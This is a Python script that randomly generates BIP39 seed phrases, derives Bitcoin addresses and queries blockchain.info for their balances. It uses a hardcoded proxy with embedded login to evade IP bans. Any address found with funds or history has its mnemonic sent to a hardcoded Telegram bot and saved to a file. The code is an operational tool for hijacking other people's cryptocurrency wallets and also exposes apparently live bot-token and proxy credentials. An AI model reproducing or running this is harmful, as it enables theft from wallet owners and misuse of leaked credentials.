import os
import grequests
import random
import threading
import time
import bip32utils
import mnemonic
import requests
from colored import fg, bg, attr

from Bip39Gen import Bip39Gen

# from notifypy import Notify

timesl = 1  # задержка между запросами

token_bot = "1526046385:AAHlG6yMCq4LK6sIUTiOFxeKRRYWER72kh0"  # создать бота и получить токен тут @BotFather
chat_id = "453442665"  # узнать ваш id можно в боте @userinfobot


def makeDir():
    path = 'results'
    if not os.path.exists(path):
        os.makedirs(path)


def userInput():
    timesltime = round(((60 / timesl) * 100) * 60)
    timesltimed = timesltime * 24
    print("BitGen by KKINULINGUS, Simba-l-l and Pashtet")
    print()
    print("{}Скорость генерации : ~{}/час ~{}/день{}".format(bg("#5F00FF"), timesltime, timesltimed, attr("reset")))
    print()
    start()


def getInternet():
    try:
        try:
            requests.get('https://www.google.com')  # im watching you!
        except requests.ConnectTimeout:
            requests.get('http://1.1.1.1')
        return True
    except requests.ConnectionError:
        return False


lock = threading.Lock()

if getInternet() == True:
    dictionary = requests.get(
        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')
else:
    pass


def getBalance3(addr):
    try:
        response = requests.get(
            f'https://blockchain.info/multiaddr?active={addr}&n=1')

        return (
            response.json()
        )
    except:
        print('{}У тебя походу бан по ip{}'.format(fg("#008700"), attr("reset")))
        time.sleep(600)
        return (getBalance3(addr))
        pass


def generateSeed():
    seed = ""
    for i in range(12):
        seed += random.choice(dictionary) if i == 0 else ' ' + \
                                                         random.choice(dictionary)
    return seed


def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)
    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(
        44 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()


def generateBd():
    adrBd = {}
    for i in range(100):
        mnemonic_words = Bip39Gen(dictionary).mnemonic
        addy = bip39(mnemonic_words)
        adrBd.update([(f'{addy}', mnemonic_words)])

    return adrBd


def listToString(s):
    str1 = "|"
    return (str1.join(s))


def sendBotMsg(msg):
    if token_bot != "":
        try:
            url = f"chat_id={chat_id}&text={msg}"
            requests.get(f"https://api.telegram.org/bot{token_bot}/sendMessage", url)
        except:
            pass


def check():
    while True:
        adrs = []
        i = 0
        print("{}START GENERATION{}".format(bg("#4682B4"), attr("reset")))
        for _ in range(5):
            adrs.append(generateBd())
        adrs_s = []
        for adr in adrs:
            adrs_s.append(listToString(adr))
        bl = get_balance_async(adrs_s)
        bl = format_responses(bl)
        for balances in bl:
            colortmp = 0
            with lock:
                for item in balances["addresses"]:
                    addy = item["address"]
                    balance = item["final_balance"]
                    received = item["total_received"]
                    try:
                        mnemonic_words = adrs[i][addy]
                    except KeyError:
                        i += 2
                        continue
                    if balance > 0:
                        msg = 'BAL: {} | REC: {} | ADDR: {} | MNEM: {}'.format(balance, received, addy, mnemonic_words)
                        sendBotMsg(msg)
                        print(
                            '{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(fg("#00ba6f"), balance, received, addy,
                                                                                 mnemonic_words, attr("reset")))
                    else:
                        if (received > 0):
                            msg = 'BAL: {} | REC: {} | ADDR: {} | MNEM: {}'.format(balance, received, addy,
                                                                                   mnemonic_words)
                            sendBotMsg(msg)
                            print('{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(
                                fg("#3597EB"), balance, received, addy, mnemonic_words, attr("reset")))
                        else:
                            # with open('results/dry.txt', 'a') as w:
                            #     w.write(f'ADDR: {addy} | BAL: {balance} | MNEM: {mnemonic_words}\n')
                            #     w.close()
                            print(
                                '{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(fg("#FFFFF"), balance, received,
                                                                                     addy,
                                                                                     mnemonic_words, attr("reset")))
                    if balance > 0:
                        with open('results/wet.txt', 'a') as w:
                            w.write(
                                f'ADDR: {addy} | BAL: {balance} | MNEM: {mnemonic_words}\n')
                            w.close()
                i += 1
            print("{}END BLOCK{}".format(bg("#32CD32"), attr("reset")))
            time.sleep(timesl)


def helpText():
    print("""@@@KKINIUSS@@@""")


def start():
    if getInternet() == True:
        check()
    else:
        print("Нет интернета!")
        userInput()


def exception_handler(req, e):
    print(("{}" + str(e) + " " + str(req) + "GENERATION{}").format(bg("#B22222"), attr("reset")))
    pass


def get_balance_async(adrs):
    proxies = {"https": "http://hdndz9:uIzHf0@51.210.128.131:19219"}
    urls = []
    for i in adrs:
        urls.append(f'https://blockchain.info/multiaddr?active={i}&n=1')

    responses = (grequests.get(url, proxies = proxies) for url in urls)
    # responses = (grequests.get(url) for url in urls)
    resp = grequests.map(responses, exception_handler=exception_handler)
    return resp


def format_responses(responses):
    jsons = []
    for i in range(len(responses)):
        try:
            jsons.append(responses[i].json())
        except Exception as e:
            print(("{}"+str(e) + "{}").format(bg("#B22222"), attr("reset")))
            print("{}Ошибка чтения ответа{}".format(bg("#B22222"), attr("reset")))
            pass
    return jsons


if __name__ == '__main__':
    try:
        makeDir()
        getInternet()
        if getInternet() == False:
            print("Нет интернета!")
        else:
            pass
        sendBotMsg("Майнится хуяйнится")
        userInput()
    except KeyboardInterrupt:
        print('пока бебра')
